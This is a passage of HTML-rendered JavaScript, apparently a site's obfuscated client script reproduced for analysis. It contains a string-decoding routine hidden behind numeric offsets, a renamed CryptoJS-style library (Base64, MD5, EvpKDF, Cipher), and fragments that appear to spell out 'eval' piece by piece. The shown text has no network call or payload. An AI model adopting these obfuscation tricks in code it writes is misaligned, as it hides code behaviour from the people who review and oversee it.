class="string">&quot;str&quot;</span>, T = <span class="string">&quot;sub&quot;</span>, P = <span class="string">&quot;cha&quot;</span>, F = <span class="string">&quot;sub&quot;</span>, E = <span class="string">&quot;rAt&quot;</span>, K = <span class="string">&quot;cha&quot;</span>, j = <span class="string">&quot;sub&quot;</span>, O = <span class="string">&quot;rAt&quot;</span>, L = <span class="string">&quot;cha&quot;</span>, M = <span class="string">&quot;len&quot;</span>, I = <span class="string">&quot;jo&quot;</span>, H = <span class="string">&quot;len&quot;</span>, X = <span class="string">&quot;str&quot;</span>, q = <span class="string">&quot;sub&quot;</span>, W = <span class="number">774547</span>, J = -<span class="number">774547</span>, N = -<span class="number">493875</span>, Q = <span class="number">493875</span>, V = -<span class="number">121770</span>, U = -<span class="number">742534</span>, G = <span class="number">742535</span>, Y = -<span class="number">439955</span>, $ = <span class="number">439956</span>, Z = <span class="number">784672</span>, ee = -<span class="number">784672</span>, te = <span class="number">447488</span>, re = <span class="number">884634</span>, ne = -<span class="number">884634</span>, ie = <span class="number">79795</span>, oe = -<span class="number">518837</span>, ae = -<span class="number">166886</span>, se = <span class="number">166887</span>, ce = -<span class="number">715883</span>, le = -<span class="number">607612</span>;</span><br><span class="line">            <span class="keyword">if</span> (_hppv[g])</span><br><span class="line">                <span class="keyword">return</span> _hppv[g];</span><br><span class="line">            <span class="keyword">for</span> (k = v + m,</span><br><span class="line">            w = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            b = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            S = g,</span><br><span class="line">            g = g[q + X](le + _ebah, g[H + y] - (ce + _vwjb)),</span><br><span class="line">            g = g[_ + d](<span class="string">&quot;&quot;</span>)[f + p]()[I + u](<span class="string">&quot;&quot;</span>),</span><br><span class="line">            B = g[M + h],</span><br><span class="line">            x = _tts + _bgi; B &gt; x; ++x)</span><br><span class="line">                x % k == k - (se + ae) &amp;&amp; (b = g[l + c](B - x - (_qax + _thb), k),</span><br><span class="line">                b = b[L + O](k - (oe + _wrp)) + b[j + s](ie + _dwuh, k - (_kiq + _csr)) + b[K + E](_qkta + _ptm),</span><br><span class="line">                b = b[F + a](ne + re, v),</span><br><span class="line">                w += b);</span><br><span class="line">            <span class="keyword">return</span> C = B % k,</span><br><span class="line">            C != te + _sycv &amp;&amp; (b = g[o + i](ee + Z, C),</span><br><span class="line">            b[n + r] != $ + Y &amp;&amp; (b = b[P + t](C - (G + U)) + b[T + z](V + _lqo, C - (_cac + _nus)) + b[R + e](Q + N)),</span><br><span class="line">            b = b[D + A](J + W, v),</span><br><span class="line">            w += b),</span><br><span class="line">            _hppv[S] = w,</span><br><span class="line">            w</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(),</span><br><span class="line">    <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yzunzgd&quot;</span>, <span class="number">4</span>, <span class="number">2</span>)] = process</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">av_</span> = <span class="string">&quot;v&quot;</span>,</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk</span><br><span class="line">      , t = e.<span class="property">lib</span>.<span class="property">WordArray</span>;</span><br><span class="line">    e.<span class="property">enc</span>.<span class="property">Base64</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span></span><br><span class="line">              , r = e.<span class="property">sigBytes</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">_map</span>;</span><br><span class="line">            e.<span class="title function_">clamp</span>(),</span><br><span class="line">            e = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; r &gt; i; i += <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> o = (t[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (i % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span> | (t[i + <span class="number">1</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((i + <span class="number">1</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span> | t[i + <span class="number">2</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((i + <span class="number">2</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>, a = <span class="number">0</span>; <span class="number">4</span> &gt; a &amp;&amp; r &gt; i + <span class="number">.75</span> * a; a++)</span><br><span class="line">                    e.<span class="title function_">push</span>(n.<span class="title function_">charAt</span>(o &gt;&gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - a) &amp; <span class="number">63</span>));</span><br><span class="line">            <span class="keyword">if</span> (t = n.<span class="title function_">charAt</span>(<span class="number">64</span>))</span><br><span class="line">                <span class="keyword">for</span> (; e.<span class="property">length</span> % <span class="number">4</span>; )</span><br><span class="line">                    e.<span class="title function_">push</span>(t);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = e.<span class="property">length</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">_map</span></span><br><span class="line">              , i = n.<span class="title function_">charAt</span>(<span class="number">64</span>);</span><br><span class="line">            i &amp;&amp; (i = e.<span class="title function_">indexOf</span>(i),</span><br><span class="line">            -<span class="number">1</span> != i &amp;&amp; (r = i));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = [], o = <span class="number">0</span>, a = <span class="number">0</span>; r &gt; a; a++)</span><br><span class="line">                <span class="keyword">if</span> (a % <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> s = n.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(a - <span class="number">1</span>)) &lt;&lt; <span class="number">2</span> * (a % <span class="number">4</span>)</span><br><span class="line">                      , c = n.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(a)) &gt;&gt;&gt; <span class="number">6</span> - <span class="number">2</span> * (a % <span class="number">4</span>);</span><br><span class="line">                    i[o &gt;&gt;&gt; <span class="number">2</span>] |= (s | c) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * (o % <span class="number">4</span>),</span><br><span class="line">                    o++</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">return</span> t.<span class="title function_">create</span>(i, o)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_map</span>: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t &amp; r | ~t &amp; n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t &amp; n | r &amp; ~n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t ^ r ^ n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (r ^ (t | ~n)) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> o = coypJsDk, a = o.<span class="property">lib</span>, s = a.<span class="property">WordArray</span>, c = a.<span class="property">Hasher</span>, a = o.<span class="property">algo</span>, l = [], h = <span class="number">0</span>; <span class="number">64</span> &gt; h; h++)</span><br><span class="line">        l[h] = <span class="number">4294967296</span> * e.<span class="title function_">abs</span>(e.<span class="title function_">sin</span>(h + <span class="number">1</span>)) | <span class="number">0</span>;</span><br><span class="line">    a = a.<span class="property">MD5</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_hash</span> = <span class="keyword">new</span> s.<span class="title function_">init</span>([<span class="number">1732584193</span>, <span class="number">4023233417</span>, <span class="number">2562383102</span>, <span class="number">271733878</span>])</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doProcessBlock</span>: <span class="keyword">function</span>(<span class="params">e, o</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; <span class="number">16</span> &gt; a; a++) &#123;</span><br><span class="line">                <span class="keyword">var</span> s = o + a</span><br><span class="line">                  , c = e[s];</span><br><span class="line">                e[s] = <span class="number">16711935</span> &amp; (c &lt;&lt; <span class="number">8</span> | c &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (c &lt;&lt; <span class="number">24</span> | c &gt;&gt;&gt; <span class="number">8</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="property">words</span></span><br><span class="line">              , s = e[o + <span class="number">0</span>]</span><br><span class="line">              , c = e[o + <span class="number">1</span>]</span><br><span class="line">              , h = e[o + <span class="number">2</span>]</span><br><span class="line">              , u = e[o + <span class="number">3</span>]</span><br><span class="line">              , p = e[o + <span class="number">4</span>]</span><br><span class="line">              , f = e[o + <span class="number">5</span>]</span><br><span class="line">              , d = e[o + <span class="number">6</span>]</span><br><span class="line">              , _ = e[o + <span class="number">7</span>]</span><br><span class="line">              , y = e[o + <span class="number">8</span>]</span><br><span class="line">              , g = e[o + <span class="number">9</span>]</span><br><span class="line">              , v = e[o + <span class="number">10</span>]</span><br><span class="line">              , m = e[o + <span class="number">11</span>]</span><br><span class="line">              , k = e[o + <span class="number">12</span>]</span><br><span class="line">              , w = e[o + <span class="number">13</span>]</span><br><span class="line">              , b = e[o + <span class="number">14</span>]</span><br><span class="line">              , S = e[o + <span class="number">15</span>]</span><br><span class="line">              , B = a[<span class="number">0</span>]</span><br><span class="line">              , x = a[<span class="number">1</span>]</span><br><span class="line">              , C = a[<span class="number">2</span>]</span><br><span class="line">              , A = a[<span class="number">3</span>]</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, s, <span class="number">7</span>, l[<span class="number">0</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, c, <span class="number">12</span>, l[<span class="number">1</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, h, <span class="number">17</span>, l[<span class="number">2</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, u, <span class="number">22</span>, l[<span class="number">3</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, p, <span class="number">7</span>, l[<span class="number">4</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, f, <span class="number">12</span>, l[<span class="number">5</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, d, <span class="number">17</span>, l[<span class="number">6</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, _, <span class="number">22</span>, l[<span class="number">7</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, y, <span class="number">7</span>, l[<span class="number">8</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, g, <span class="number">12</span>, l[<span class="number">9</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, v, <span class="number">17</span>, l[<span class="number">10</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, m, <span class="number">22</span>, l[<span class="number">11</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, k, <span class="number">7</span>, l[<span class="number">12</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, w, <span class="number">12</span>, l[<span class="number">13</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, b, <span class="number">17</span>, l[<span class="number">14</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, S, <span class="number">22</span>, l[<span class="number">15</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, c, <span class="number">5</span>, l[<span class="number">16</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, d, <span class="number">9</span>, l[<span class="number">17</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, m, <span class="number">14</span>, l[<span class="number">18</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, s, <span class="number">20</span>, l[<span class="number">19</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, f, <span class="number">5</span>, l[<span class="number">20</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, v, <span class="number">9</span>, l[<span class="number">21</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, S, <span class="number">14</span>, l[<span class="number">22</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, p, <span class="number">20</span>, l[<span class="number">23</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, g, <span class="number">5</span>, l[<span class="number">24</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, b, <span class="number">9</span>, l[<span class="number">25</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, u, <span class="number">14</span>, l[<span class="number">26</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, y, <span class="number">20</span>, l[<span class="number">27</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, w, <span class="number">5</span>, l[<span class="number">28</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, h, <span class="number">9</span>, l[<span class="number">29</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, _, <span class="number">14</span>, l[<span class="number">30</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, k, <span class="number">20</span>, l[<span class="number">31</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, f, <span class="number">4</span>, l[<span class="number">32</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, y, <span class="number">11</span>, l[<span class="number">33</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, m, <span class="number">16</span>, l[<span class="number">34</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, b, <span class="number">23</span>, l[<span class="number">35</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, c, <span class="number">4</span>, l[<span class="number">36</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, p, <span class="number">11</span>, l[<span class="number">37</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, _, <span class="number">16</span>, l[<span class="number">38</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, v, <span class="number">23</span>, l[<span class="number">39</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, w, <span class="number">4</span>, l[<span class="number">40</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, s, <span class="number">11</span>, l[<span class="number">41</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, u, <span class="number">16</span>, l[<span class="number">42</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, d, <span class="number">23</span>, l[<span class="number">43</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, g, <span class="number">4</span>, l[<span class="number">44</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, k, <span class="number">11</span>, l[<span class="number">45</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, S, <span class="number">16</span>, l[<span class="number">46</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, h, <span class="number">23</span>, l[<span class="number">47</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, s, <span class="number">6</span>, l[<span class="number">48</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, _, <span class="number">10</span>, l[<span class="number">49</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, b, <span class="number">15</span>, l[<span class="number">50</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, f, <span class="number">21</span>, l[<span class="number">51</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, k, <span class="number">6</span>, l[<span class="number">52</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, u, <span class="number">10</span>, l[<span class="number">53</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, v, <span class="number">15</span>, l[<span class="number">54</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, c, <span class="number">21</span>, l[<span class="number">55</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, y, <span class="number">6</span>, l[<span class="number">56</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, S, <span class="number">10</span>, l[<span class="number">57</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, d, <span class="number">15</span>, l[<span class="number">58</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, w, <span class="number">21</span>, l[<span class="number">59</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, p, <span class="number">6</span>, l[<span class="number">60</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, m, <span class="number">10</span>, l[<span class="number">61</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, h, <span class="number">15</span>, l[<span class="number">62</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, g, <span class="number">21</span>, l[<span class="number">63</span>]);</span><br><span class="line">            a[<span class="number">0</span>] = a[<span class="number">0</span>] + B | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">1</span>] = a[<span class="number">1</span>] + x | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">2</span>] = a[<span class="number">2</span>] + C | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">3</span>] = a[<span class="number">3</span>] + A | <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">              , r = t.<span class="property">words</span></span><br><span class="line">              , n = <span class="number">8</span> * <span class="variable language_">this</span>.<span class="property">_nDataBytes</span></span><br><span class="line">              , i = <span class="number">8</span> * t.<span class="property">sigBytes</span>;</span><br><span class="line">            r[i &gt;&gt;&gt; <span class="number">5</span>] |= <span class="number">128</span> &lt;&lt; <span class="number">24</span> - i % <span class="number">32</span>;</span><br><span class="line">            <span class="keyword">var</span> o = e.<span class="title function_">floor</span>(n / <span class="number">4294967296</span>);</span><br><span class="line">            <span class="keyword">for</span> (r[(i + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>) + <span class="number">15</span>] = <span class="number">16711935</span> &amp; (o &lt;&lt; <span class="number">8</span> | o &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (o &lt;&lt; <span class="number">24</span> | o &gt;&gt;&gt; <span class="number">8</span>),</span><br><span class="line">            r[(i + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>) + <span class="number">14</span>] = <span class="number">16711935</span> &amp; (n &lt;&lt; <span class="number">8</span> | n &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (n &lt;&lt; <span class="number">24</span> | n &gt;&gt;&gt; <span class="number">8</span>),</span><br><span class="line">            t.<span class="property">sigBytes</span> = <span class="number">4</span> * (r.<span class="property">length</span> + <span class="number">1</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="property">_hash</span>,</span><br><span class="line">            r = t.<span class="property">words</span>,</span><br><span class="line">            n = <span class="number">0</span>; <span class="number">4</span> &gt; n; n++)</span><br><span class="line">                i = r[n],</span><br><span class="line">                r[n] = <span class="number">16711935</span> &amp; (i &lt;&lt; <span class="number">8</span> | i &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (i &lt;&lt; <span class="number">24</span> | i &gt;&gt;&gt; <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = c.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">_hash</span> = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="title function_">clone</span>(),</span><br><span class="line">            e</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    o.<span class="property">MD5</span> = c.<span class="title function_">_createHelper</span>(a),</span><br><span class="line">    o.<span class="property">HmacMD5</span> = c.<span class="title function_">_createHmacHelper</span>(a)</span><br><span class="line">&#125;(<span class="title class_">Math</span>);</span><br><span class="line"><span class="keyword">var</span> born = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk</span><br><span class="line">      , t = e.<span class="property">lib</span></span><br><span class="line">      , r = t.<span class="property">Base</span></span><br><span class="line">      , n = t.<span class="property">WordArray</span></span><br><span class="line">      , t = e.<span class="property">algo</span></span><br><span class="line">      , i = t.<span class="property">EvpKDF</span> = r.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: r.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">keySize</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="attr">hasher</span>: t.<span class="property">MD5</span>,</span><br><span class="line">            <span class="attr">iterations</span>: <span class="number">1</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(e)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">compute</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">cfg</span>, i = r.<span class="property">hasher</span>.<span class="title function_">create</span>(), o = n.<span class="title function_">create</span>(), a = o.<span class="property">words</span>, s = r.<span class="property">keySize</span>, r = r.<span class="property">iterations</span>; a.<span class="property">length</span> &lt; s; ) &#123;</span><br><span class="line">                c &amp;&amp; i.<span class="title function_">update</span>(c);</span><br><span class="line">                <span class="keyword">var</span> c = i.<span class="title function_">update</span>(e).<span class="title function_">finalize</span>(t);</span><br><span class="line">                i.<span class="title function_">reset</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">1</span>; r &gt; l; l++)</span><br><span class="line">                    c = i.<span class="title function_">finalize</span>(c),</span><br><span class="line">                    i.<span class="title function_">reset</span>();</span><br><span class="line">                o.<span class="title function_">concat</span>(c)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> o.<span class="property">sigBytes</span> = <span class="number">4</span> * s,</span><br><span class="line">            o</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    e.<span class="property">EvpKDF</span> = <span class="keyword">function</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> i.<span class="title function_">create</span>(r).<span class="title function_">compute</span>(e, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">nvl_</span> = <span class="string">&quot;al&quot;</span>,</span><br><span class="line">coypJsDk.<span class="property">lib</span>.<span class="property">Cipher</span> || <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = coypJsDk</span><br><span class="line">      , r = t.<span class="property">lib</span></span><br><span class="line">      , n = r.<span class="property">Base</span></span><br><span class="line">      , i = r.<span class="property">WordArray</span></span><br><span class="line">      , o = r.<span class="property">BufferedBlockAlgorithm</span></span><br><span class="line">      , a = t.<span class="property">enc</span>.<span class="property">Base64</span></span><br><span class="line">      , s = t.<span class="property">algo</span>.<span class="property">EvpKDF</span></span><br><span class="line">      , c = r.<span class="property">Cipher</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: n.<span class="title function_">extend</span>(),</span><br><span class="line">        <span class="attr">createEncryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">create</span>(<span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>, e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">createDecryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">create</span>(<span class="variable language_">this</span>.<span class="property">_DEC_XFORM_MODE</span>, e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(r),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_xformMode</span> = e,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_key</span> = t,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            o.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doReset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">process</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">finalize</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doFinalize</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">_ENC_XFORM_MODE</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">_DEC_XFORM_MODE</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">_createHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r ? d : f).<span class="title function_">encrypt</span>(e, t, r, n)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r ? d : f).<span class="title function_">decrypt</span>(e, t, r, n)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    